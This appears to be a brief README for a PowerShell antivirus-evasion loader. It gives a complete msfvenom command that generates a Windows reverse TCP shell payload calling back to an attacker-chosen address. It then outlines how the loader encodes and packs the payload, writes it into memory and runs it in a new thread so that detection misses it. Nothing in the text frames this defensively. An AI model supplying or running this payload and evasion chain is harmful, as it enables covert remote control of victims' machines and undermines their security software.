# Powershell_Av_Evasion2
Don't guarantee it will work is just basic powershell script that uses windowsAPI

to generate a simple payload u can use `msfvenom` with this command 
```
msfvenom -p windows/shell_reverse_tcp LHOST=<your IP address> LPORT=<your listening port> -f psh-net
```

it just encodes the payload
compresses and encrypts the payload with UPX packer
allocates memory 
writes the payload into memory
creates a new thread and executes it
